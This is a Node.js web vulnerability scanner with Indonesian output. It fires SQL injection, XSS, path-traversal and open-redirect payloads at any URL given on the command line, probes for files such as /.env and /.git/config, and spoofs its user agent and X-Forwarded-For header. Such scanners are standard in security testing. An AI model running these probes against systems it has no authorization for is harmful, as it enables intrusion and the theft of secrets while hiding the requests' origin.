const axios = require('axios');
const { URL } = require('url');

const PAYLOADS = {
  sqli: ["'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", "1' AND SLEEP(5)--"],
  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>", "javascript:alert(1)"],
  lfi: ["../../../../etc/passwd", "../../../../windows/win.ini", "....//....//....//etc/passwd", "/etc/passwd%00"],
  redirect: ["https://evil.com", "//evil.com", "http://evil.com"],
  info: ["/robots.txt", "/.env", "/.git/config", "/wp-config.php.bak", "/phpinfo.php"]
};

const UA_LIST = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
];

const rnd = a => a[Math.floor(Math.random() * a.length)];

async function scanUrl(targetUrl) {
  const results = [];
  let base;
  try { base = new URL(targetUrl); } catch (e) {
    return { ok: false, msg: 'URL tidak valid' };
  }

  const headers = {
    'User-Agent': rnd(UA_LIST),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'X-Forwarded-For': [1,1,1,1].map(() => Math.floor(Math.random()*255)).join('.')
  };

  // 1. Info Disclosure
  for (const path of PAYLOADS.info) {
    try {
      const res = await axios.get(base.origin + path, { headers, timeout: 10000, validateStatus: () => true });
      if (res.status === 200 && res.data && res.data.length > 10) {
        results.push({
          type: 'Info Disclosure',
          severity: 'Medium',
          url: base.origin + path,
          detail: 'File sensitif bisa diakses publik.'
        });
      }
    } catch (e) {}
  }

  // 2. SQL Injection
  for (const payload of PAYLOADS.sqli) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
      const start = Date.now();
      const res = await axios.get(testUrl, { headers, timeout: 15000, validateStatus: () => true });
      const elapsed = Date.now() - start;
      const body = String(res.data || '').toLowerCase();
      const sqlErrors = ['sql syntax', 'mysql_fetch', 'ora-', 'syntax error', 'unclosed quotation', 'pg_query', 'sqlite_'];
      if (sqlErrors.some(err => body.includes(err))) {
        results.push({ type: 'SQL Injection (Error-based)', severity: 'Critical', url: testUrl, detail: 'Error database muncul (payload: ' + payload + ')' });
        break;
      }
      if (elapsed > 4500 && payload.includes('SLEEP')) {
        results.push({ type: 'SQL Injection (Time-based Blind)', severity: 'Critical', url: testUrl, detail: 'Response delay terdeteksi (' + elapsed + 'ms).' });
        break;
      }
    } catch (e) {}
  }

  // 3. XSS
  for (const payload of PAYLOADS.xss) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
      const res = await axios.get(testUrl, { headers, timeout: 10000, validateStatus: () => true });
      if (String(res.data).includes(payload)) {
        results.push({ type: 'Cross-Site Scripting (XSS)', severity: 'High', url: testUrl, detail: 'Payload reflected di response.' });
        break;
      }
    } catch (e) {}
  }

  // 4. LFI
  for (const payload of PAYLOADS.lfi) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
      const res = await axios.get(testUrl, { headers, timeout: 10000, validateStatus: () => true });
      const body = String(res.data || '');
      if (body.includes('root:x:') || body.includes('[extensions]') || body.includes('DAEMON')) {
        results.push({ type: 'Local File Inclusion (LFI)', severity: 'Critical', url: testUrl, detail: 'File sistem berhasil dibaca.' });
        break;
      }
    } catch (e) {}
  }

  // 5. Open Redirect
  for (const payload of PAYLOADS.redirect) {
    try {
      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'redirect=' + encodeURIComponent(payload);
      const res = await axios.get(testUrl, { headers, timeout: 10000, validateStatus: () => true, maxRedirects: 0 });
      if (res.status >= 300 && res.status < 400 && res.headers.location && res.headers.location.includes('evil.com')) {
        results.push({ type: 'Open Redirect', severity: 'Medium', url: testUrl, detail: 'Redirect ke domain luar berhasil.' });
        break;
      }
    } catch (e) {}
  }

  // 6. Header Config
  try {
    const res = await axios.get(base.href, { headers, timeout: 10000, validateStatus: () => true });
    const secHeaders = ['x-frame-options', 'x-content-type-options', 'content-security-policy', 'strict-transport-security'];
    const missing = secHeaders.filter(h => !res.headers[h]);
    if (missing.length > 0) {
      results.push({ type: 'Salah Konfigurasi Header', severity: 'Low', url: base.href, detail: 'Header keamanan tidak ada: ' + missing.join(', ') });
    }
    if (res.headers['server']) {
      results.push({ type: 'Info Disclosure (Server Header)', severity: 'Low', url: base.href, detail: 'Server bocor versi: ' + res.headers['server'] });
    }
  } catch (e) {}

  return { ok: true, results };
}

async function main() {
  const target = process.argv[2];
  if (!target) {
    console.log('Usage: node vuln-scanner.js <URL>');
    process.exit(1);
  }

  console.log('=== WEB VULN SCANNER ===');
  console.log('Target:', target);
  console.log('------------------');

  const res = await scanUrl(target);
  if (!res.ok) { console.log('Error:', res.msg); return; }

  if (res.results.length === 0) {
    console.log('Tidak ada celah terdeteksi (dengan payload basic).');
  } else {
    res.results.forEach((r, i) => {
      console.log('\n[' + (i + 1) + '] ' + r.type + ' (' + r.severity + ')');
      console.log('    URL: ' + r.url);
      console.log('    Detail: ' + r.detail);
    });
  }
  console.log('\n------------------');
  console.log('Total celah ditemukan:', res.results.length);
}

main();
